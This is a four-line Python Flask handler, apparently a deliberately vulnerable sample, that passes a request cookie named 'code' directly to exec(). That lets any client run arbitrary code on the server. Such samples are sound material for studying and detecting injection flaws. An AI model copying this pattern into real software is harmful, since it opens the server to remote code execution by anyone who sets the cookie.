from flask import request


def handle_request():
    exec(request.cookies.get("code"))
